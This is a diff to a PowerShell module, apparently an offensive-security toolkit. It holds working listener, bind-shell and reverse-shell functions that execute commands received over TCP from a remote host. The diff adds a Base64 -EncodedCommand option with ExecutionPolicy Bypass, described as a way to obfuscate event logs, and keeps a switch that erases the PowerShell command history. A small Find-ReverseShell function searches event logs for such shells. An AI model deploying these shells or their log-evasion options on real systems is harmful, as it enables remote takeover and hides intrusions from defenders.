@@ -15,6 +15,10 @@
     Start-Listener [[-Port] <int32>]
 
 
+.PARAMETER Port
+    This parameter is for defining the listening port to connect too.
+    The cmdlet binds connections to the port that you specify.
+
 .PARAMETERS
     -Port [<Int32>]
         This parameter is for defining the listening port to connect too.
@@ -58,9 +62,14 @@
 
 
 .LINK
+    https://roberthsoborne.com
+    https://osbornepro.com
     https://github.com/tobor88
+    https://gitlab.com/tobor88
     https://www.powershellgallery.com/profiles/tobor
-    https://roberthosborne.com
+    https://www.linkedin.com/in/roberthosborne/
+    https://www.youracclaim.com/users/roberthosborne/badges
+    https://www.hackthebox.eu/profile/52286
 
 #>
 Function Start-Listener {
@@ -72,7 +81,7 @@ Function Start-Listener {
                 ValueFromPipeline=$False,
                 HelpMessage='Enter a port to listen on. Valid ports are between 1 and 65535. Example: 1234')] # End Parameter
             [ValidateRange(1,65535)]
-            [int32]$Port = 1337
+            [Int32]$Port = 1337
         ) # End param
 
     Write-Verbose "Defining listener object"
@@ -90,11 +99,11 @@ Function Start-Listener {
     Write-Verbose "Starting listener on port $PortString and creating job to allow closing the connection"
 
     $Socket.Start()
-    Write-Output ("Listening on [0.0.0.0] (port " + $Port + ")")
-    While ($true)
+    Write-Output ("[*] Listening on [0.0.0.0] (port " + $Port + ")")
+    While ($True)
     {
 
-        Write-Verbose "Begin loop allowing Ctrl+C to stop the listener"
+        Write-Verbose "Waiting for connection..."
         If ($Socket.Pending())
         {
 
@@ -104,11 +113,11 @@ Function Start-Listener {
 
         }  # End If
 
-        Start-Sleep -Seconds 1
+        Start-Sleep -Seconds 2
 
      }  # End While
 
-    Write-Output "[*] Connection Established."
+    Write-Output "[*] Connection Established"
 
     Write-Verbose "Creating byte stream"
     $Stream = $Client.GetStream()
@@ -175,6 +184,11 @@ Function Start-Listener {
     Start-Bind [[-Port] <int32>]
 
 
+.PARAMETER Port
+    This parameter is for defining the listening port that PowerShell should attach too
+    This cmdlet binds powershell to the port you speficy
+
+
 .PARAMETERS
     -Port [<Int32>]
         This parameter is for defining the listening port that PowerShell should attach too
@@ -207,7 +221,6 @@ Function Start-Listener {
     Author: Rob Osborne
     ALias: tobor
     Contact: rosborne@osbornepro.com
-    https://roberthsoborne.com
 
 
 .INPUTS
@@ -219,9 +232,14 @@ Function Start-Listener {
 
 
 .LINK
+    https://roberthsoborne.com
+    https://osbornepro.com
     https://github.com/tobor88
+    https://gitlab.com/tobor88
     https://www.powershellgallery.com/profiles/tobor
-    https://roberthosborne.com
+    https://www.linkedin.com/in/roberthosborne/
+    https://www.youracclaim.com/users/roberthosborne/badges
+    https://www.hackthebox.eu/profile/52286
 
 #>
 Function Start-Bind {
@@ -233,7 +251,7 @@ Function Start-Bind {
                 ValueFromPipeline=$False,
                 HelpMessage='Enter a port to listen on. Valid ports are between 1 and 65535. Example: 1234')] # End Parameter
             [ValidateRange(1,65535)]
-            [int32]$Port = 1337
+            [Int32]$Port = 1337
         )  # End param
 
         $PortString = $Port.ToString()
@@ -259,20 +277,20 @@ Function Start-Bind {
 
          }  # End While
 
-        Write-Output "[*] Connection Established."
+        Write-Output "[*] Connection Established"
         $Stream = $Client.GetStream()
 
         Write-Verbose "Streaming bytes to PowerShell connection"
-       [byte[]]$Bytes = 0..65535 | ForEach-Object -Process { 0 }
-       $SendBytes = ([text.encoding]::ASCII).GetBytes("Logged into PowerShell as " + $env:USERNAME + " on " + $env:COMPUTERNAME + "`n`n")
+        [byte[]]$Bytes = 0..65535 | ForEach-Object -Process { 0 }
+        $SendBytes = ([text.encoding]::ASCII).GetBytes("Logged into PowerShell as " + $env:USERNAME + " on " + $env:COMPUTERNAME + "`n`n")
 
-       $Stream.Write($SendBytes,0,$SendBytes.Length)
-       $SendBytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
-       $Stream.Write($SendBytes,0,$SendBytes.Length)
+        $Stream.Write($SendBytes,0,$SendBytes.Length)
+        $SendBytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
+        $Stream.Write($SendBytes,0,$SendBytes.Length)
 
         Write-Verbose "Begin command execution cycle"
-       While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
-       {
+        While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
+        {
 
             $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
             $Data = $EncodedText.GetString($Bytes, 0, $i)
@@ -332,6 +350,28 @@ Function Start-Bind {
     Invoke-ReversePowerShell [-IpAddress] <string> [[-Port] <int32>]
 
 
+.PARAMETER IpAddress
+    This parameter is for defining the IPv4 address to connect too on a remote machine.
+    This cmdlet looks for a connection at this IP address on the remote host.
+
+.PARAMETER Port
+    This parameter is for defining the listening port to attach to on a remote machine
+    This cmdlet looks for a connection on a remote host using the port that you speficy here.
+
+.PARAMETER Reverse
+    This switch parameter sets the Reverse parameter set value to be used. This is the default
+    parameter set value and is not required.
+
+.PARAMETER Bind
+    This switch paramter sets the Bind parameter set values to be used
+
+.PARAMETER Obfuscate
+    This switch parameter is used to execute PowerShell commands using Base64 in an attempt to
+    obfuscate logs.
+
+.PARAMETER ClearHistory
+    This switch parameter is used to attempt clearing the PowerShell command history upon exiting a session.
+
 .PARAMETERS
     -IpAddress [<String>]
         This parameter is for defining the IPv4 address to connect too on a remote machine
@@ -353,8 +393,35 @@ Function Start-Bind {
         Accept pipeline input?       false
         Accept wildcard characters?  false
 
+    -Obfuscate [<SwitchParameter>]
+        This switch parameter is used to Base64 obfuscate in the Event Log any PowerShell commands executed.
+
+        Required?                    false
+        Position?                    named
+        Default value                false
+        Accept pipeline input?       false
+        Accept wildcard characters?  false
+
     -ClearHistory [<SwitchParameter>]
         This switch parameter is used to attempt clearing the PowerShell command history upon exiting a session
+
+        Required?                    false
+        Position?                    named
+        Default value                false
+        Accept pipeline input?       false
+        Accept wildcard characters?  false
+
+    -Reverse [<SwitchParameter>]
+        This switch parameter is used to set the ParameterSetName to Reverse
+
+        Required?                    false
+        Position?                    named
+        Default value                false
+        Accept pipeline input?       false
+        Accept wildcard characters?  false
+
+    -Bind [<SwitchParameter>]
+        This switch parameter is used to set the ParameterSetName to Bind
 
         Required?                    false
         Position?                    named
@@ -371,19 +438,46 @@ Function Start-Bind {
 
 .EXAMPLE
     -------------------------- EXAMPLE 1 --------------------------
+    Invoke-ReversePowerShell 192.168.2.1 1234 -ClearHistory
     Invoke-ReversePowerShell -IpAddress 192.168.2.1 -Port 1234 -ClearHistory
-    This examples connects to port 1234 on remote machine 192.168.2.1
+    Invoke-ReversePowerShell -Reverse -IpAddress 192.168.2.1 -Port 1234 -ClearHistory
+
+    This above command examples all do the same thing. They connect to port 1234 on
+    remote machine 192.168.2.1 and clear the commands executed history afterwards.
 
     -------------------------- EXAMPLE 2 --------------------------
-    Invoke-ReversePowerShell 192.168.2.1 1337
-    This examples connects to port 1337 on remote machine 192.168.2.1.
+    Invoke-ReversePowerShell 192.168.2.1 1337 -Obfuscate
+    Invoke-ReversePowerShell -IpAddress 192.168.2.1 -Port 1337 -Obfuscate
+    Invoke-ReversePowerShell -Reverse -IpAddress 192.168.2.1 -Port 1337 -Obfuscate
+
+    The above command examples all do the same thing. They connect to port 1337 on
+    remote machine 192.168.2.1. Any commands executed are obfuscated using Base64.
+
+    -------------------------- EXAMPLE 2 --------------------------
+    Invoke-ReversePowerShell -Bind 192.168.2.1 1337 -Obfuscate -ClearHistory
+    Invoke-ReversePowerShell -IpAddress 192.168.2.1 -Port 1337 -Obfuscate -ClearHistory
+    Invoke-ReversePowerShell -Bind -IpAddress 192.168.2.1 -Port 1337 -Obfuscate -ClearHistory
+
+    The above command examples all do the same thing. They connect to bind port 1337 on
+    remote machine 192.168.2.1. Any commands executed are obfuscated using Base64.
+    The powershell command history is then attempted to be earsed.
 
 
 .NOTES
-    Author: Rob Osborne
+    Author: Robert H. Osborne
     ALias: tobor
     Contact: rosborne@osbornepro.com
+
+
+.LINK
     https://roberthsoborne.com
+    https://osbornepro.com
+    https://github.com/tobor88
+    https://gitlab.com/tobor88
+    https://www.powershellgallery.com/profiles/tobor
+    https://www.linkedin.com/in/roberthosborne/
+    https://www.youracclaim.com/users/roberthosborne/badges
+    https://www.hackthebox.eu/profile/52286
 
 
 .INPUTS
@@ -393,17 +487,19 @@ Function Start-Bind {
 .OUTPUTS
     None
 
-
-.LINK
-    https://github.com/tobor88
-    https://www.powershellgallery.com/profiles/tobor
-    https://roberthosborne.com
-
 #>
 Function Invoke-ReversePowerShell {
-    [CmdletBinding()]
+    [CmdletBinding(DefaultParameterSetName="Reverse")]
         param(
             [Parameter(
+                ParameterSetName="Reverse",
+                Mandatory=$True,
+                Position=0,
+                ValueFromPipeline=$True,
+                ValueFromPipelineByPropertyName=$True,
+                HelpMessage="Enter the IP Address of the remote machine. Example: 10.10.14.21")] # End Parameter
+            [Parameter(
+                ParameterSetName="Bind",
                 Mandatory=$True,
                 Position=0,
                 ValueFromPipeline=$True,
@@ -413,19 +509,47 @@ Function Invoke-ReversePowerShell {
             [IPAddress]$IpAddress,
 
             [Parameter(
+                ParameterSetName="Reverse",
+                Mandatory=$False,
+                Position=1,
+                ValueFromPipeline=$False,
+                HelpMessage="Enter the port number the remote machine is listening on. Example: 1234")] # End Parameter
+            [Parameter(
+                ParameterSetName="Bind",
                 Mandatory=$False,
                 Position=1,
                 ValueFromPipeline=$False,
                 HelpMessage="Enter the port number the remote machine is listening on. Example: 1234")] # End Parameter
             [ValidateNotNullorEmpty()]
             [ValidateRange(1,65535)]
-            [int32]$Port = 1337,
+            [Int32]$Port = 1337,
 
             [Parameter(
-                Mandatory=$False)]
+                ParameterSetName="Reverse")]  # End Parameter
+            [Switch]$Reverse,
+
+            [Parameter(
+                ParameterSetName="Bind")]  # End Parameter
+            [Switch]$Bind,
+
+            [Parameter(
+                ParameterSetName="Reverse",
+                Mandatory=$False)]  # End Parameter
+            [Parameter(
+                ParameterSetName="Bind",
+                Mandatory=$False)]  # End Parameter
+            [Switch][Bool]$Obfuscate,
+
+            [Parameter(
+                ParameterSetName="Reverse",
+                Mandatory=$False)]  # End Parameter
+            [Parameter(
+                ParameterSetName="Bind",
+                Mandatory=$False)]  # End Parameter
             [Alias("C","Cls","Ch","Clear")]
-            [switch][bool]$ClearHistory
+            [Switch][Bool]$ClearHistory
         ) # End param
+
 
     Write-Verbose "Creating a fun infinite loop. - The Shadow King (Amahl Farouk)"
     $GodsMakeRules = "They dont follow them"
@@ -439,9 +563,9 @@ Function Invoke-ReversePowerShell {
         Try
         {
 
-            Write-Output "Connection attempted. Check your listener."
+            Write-Output "[*] Connection attempted. Check your listener."
 
-            $Client = New-Object System.Net.Sockets.TCPClient($IpAddress,$Port)
+            $Client = New-Object -TypeName System.Net.Sockets.TCPClient($IpAddress,$Port)
             $Stream = $Client.GetStream()
 
             [byte[]]$Bytes = 0..255 | ForEach-Object -Process {0}
@@ -459,7 +583,7 @@ Function Invoke-ReversePowerShell {
                     If ($ClearHistory.IsPresent)
                     {
 
-                        Write-Verbose "[*] Attempting to clear command history"
+                        Write-Output "[*] Attempting to clear command history"
 
                         Clear-History
                         Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force
@@ -476,8 +600,23 @@ Function Invoke-ReversePowerShell {
                 {
 
                     # Executes commands
-                    $ExecuteCmd = Invoke-Expression -Command $Command 2>&1 | Out-String
-                    $ExecuteCmdAgain  = $ExecuteCmd + "PS " + (Get-Location).Path + "> "
+                    If ($Obfuscate.IsPresent)
+                    {
+
+                        Write-Verbose "Obfuscating command"
+
+                        $Base64Cmd = ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$Command")))
+                        $ExecuteCmd = PowerShell.exe -EncodedCommand $Base64Cmd -NoLogo -NoProfile -ExecutionPolicy Bypass | Out-String
+                        $ExecuteCmdAgain = $ExecuteCmd + "PS " + (Get-Location).Path + "> "
+
+                    }  # End If
+                    Else
+                    {
+
+                        $ExecuteCmd = Invoke-Expression -Command $Command 2>&1 | Out-String
+                        $ExecuteCmdAgain  = $ExecuteCmd + "PS " + (Get-Location).Path + "> "
+
+                    }  # End Else
 
                 } # End Try
                 Catch
@@ -505,14 +644,14 @@ Function Invoke-ReversePowerShell {
                 If ($ClearHistory.IsPresent)
                 {
 
-                    Write-Verbose "[*] Attempting to clear command history"
+                    Write-Output "[*] Attempting to clear command history"
 
                     Clear-History
                     Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force
 
                 }  # End If
 
-                Write-Verbose "Client closing"
+                Write-Verbose "Client closing..."
                 $Client.Close()
                 Write-Verbose "Client connection closed"
 
@@ -521,7 +660,7 @@ Function Invoke-ReversePowerShell {
             If ($ClearHistory.IsPresent)
             {
 
-                Write-Verbose "[*] Attempting to clear command history"
+                Write-Verbose "Attempting to clear command history"
 
                 Clear-History
                 Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force
@@ -563,6 +702,13 @@ Function Invoke-ReversePowerShell {
     Search the Windows Event Viewer for event id 4656 where a tcp listener was created and connected too.
     The appropriate logging will need to be enabled in the event viewer.
 
+
+.PARAMETER ComputerName
+    This parameter is for helping to better define a connection you may want to look for. This parameter is currently
+    not in use for this cmdlet.
+
+.PARAMETER Path
+    Specifies a path to one locations. Wildcards are not permitted.
 
 .PARAMETERS
     -ComputerName [<String>]
@@ -621,9 +767,14 @@ Function Invoke-ReversePowerShell {
     Find-ReverseShell returns System.Diagnostics.Eventing.Reader.EventLogRecord objects.
 
 .LINK
-    https://www.powershellgallery.com/profiles/tobor
+    https://roberthsoborne.com
+    https://osbornepro.com
     https://github.com/tobor88
-    https://roberthosborne.com
+    https://gitlab.com/tobor88
+    https://www.powershellgallery.com/profiles/tobor
+    https://www.linkedin.com/in/roberthosborne/
+    https://www.youracclaim.com/users/roberthosborne/badges
+    https://www.hackthebox.eu/profile/52286
 
 #>
 Function Find-ReverseShell {
@@ -659,48 +810,14 @@ Function Find-ReverseShell {
         Write-Verbose "Building XML file"
         $TcpListenerCheck.ToXml() | Out-File -FilePath $FilePath
 
-        Write-Output "Reverse Shell check has completed. A reverse shell has been discovered to exist from the last 24 hours.`n`n$FilePath contains the related events in XML format."
+        Write-Warning "A reverse shell has been discovered to exist from the last 24 hours.`n`n$FilePath contains the related events in XML format."
 
     }  # End If
     Else
     {
 
-        Write-Output "No Reverse shells have been discovered to exist in the last 24 hours."
+        Write-Output "[*] No Reverse shells have been discovered to exist in the last 24 hours."
 
     }  # End Else
 
 } # End Function Find-ReverseShell
-
-# SIG # Begin signature block
-# MIIFqQYJKoZIhvcNAQcCoIIFmjCCBZYCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
-# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
-# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUO14/NM4Fh5gf81FsVyftlcKk
-# L4mgggM8MIIDODCCAiCgAwIBAgIQYFQwLhutS7lNh5moK8BttzANBgkqhkiG9w0B
-# AQsFADAiMSAwHgYDVQQDDBdyb3Nib3JuZUBvc2Jvcm5lcHJvLmNvbTAeFw0yMDAz
-# MTMyMjU2MjZaFw0yMTAzMTMyMzE2MjZaMCIxIDAeBgNVBAMMF3Jvc2Jvcm5lQG9z
-# Ym9ybmVwcm8uY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAucWj
-# mMM8tYpBCLl+z1Q1xThCZhFrpQ8deiGrRN4zyVu9lBAZGFeQdAZDRhGoB7tuBc87
-# p/NrLdgJ+7O8ZQOr+BsAHermyamcoSpzASkM6NvPfL3XdmEnQ9CrKHxJyyELYwSi
-# TYZGE4/T6DHqgfPR4BBKxVnkd+I4CRvgHLeBh6hKll2jAIc18U0rmTePqYzpmBIX
-# cfPz+csHovh1BjdSMzJwvgSrBRs5r919F2Eq+FonzbAlDDdSyLc474FUNn5nAkHM
-# z3jhsj4gIqlV01MR7A3IE7/KaNE/AdA4U57d9glNr0ak5AfkdR5IR0rrm0bB3N6I
-# xdJfiRRPclqVGnDD9QIDAQABo2owaDAOBgNVHQ8BAf8EBAMCB4AwEwYDVR0lBAww
-# CgYIKwYBBQUHAwMwIgYDVR0RBBswGYIXcm9zYm9ybmVAb3Nib3JuZXByby5jb20w
-# HQYDVR0OBBYEFEfj/QMM2rvYqNn7iRDgC8SSBfmdMA0GCSqGSIb3DQEBCwUAA4IB
-# AQA7A226Sy/QERa7s+gy2ujaFlqRqIZeTCJHMARp74rG6rw/ummfXFbJg2tjY+oa
-# 8Owo6CMcLVMmXGV3gRn1uwvCVubOJpnIZl4q+wdXrppMC/PGeY2ZEGgJmaMUPe0Y
-# RjISywCkE90eJY4xCYiswGWqLt7jP6L7Svl+79EkfcPlclHjVe4B9CT+Tdp5U8rJ
-# +PAirzcTHw19CQ3Vk9PxpIr2UsNu/JGQ9zGvYzIBwFxiw9lRnQCAJLiCXCPhf5fB
-# pbhRS/F7Sa4ZlcZORItK9A1M+WmD0Kxoq1teoKqs1zng/mWn0xgNvS2Jf/eSugEE
-# pBnZp/WhIGvH7eb/zIewwo5kMYIB1zCCAdMCAQEwNjAiMSAwHgYDVQQDDBdyb3Ni
-# b3JuZUBvc2Jvcm5lcHJvLmNvbQIQYFQwLhutS7lNh5moK8BttzAJBgUrDgMCGgUA
-# oHgwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkqhkiG9w0BCQMxDAYKKwYB
-# BAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGCNwIBFTAjBgkqhkiG9w0B
-# CQQxFgQUDCRDuNa5Y/P4Qm9ZECX1UqNMhhowDQYJKoZIhvcNAQEBBQAEggEAiGUJ
-# pJnlk+uOr6sze0THS+RQ3ppZpP572EM/moPWTa8xutd+LDqcnm54fZiqMF2f58ET
-# UGIMOUuqcFMgx+oZKGfoDiYa7mQ3BfqD96zNF9rKwGGvIBPwXzDC5rXnSEqA4crp
-# GDg1yhZGIt63ldEsCal1cZAEXVdVGVj2D0niFcj9oj0e6utJDcX8FufV/SlHpgeT
-# X0wkhh6YnJ2mNAtMaghLkhabFfNcg+mmgSz2CZWlh7lejo5jdZ8xYS33Vy4ob1Hl
-# jwktZEDDydWRsRBett0XnYs4IYjasffzrgrWzeOgZCfx219imE5hK5pHChHbo0JE
-# q5pw22K8zhtEa24SeQ==
-# SIG # End signature block
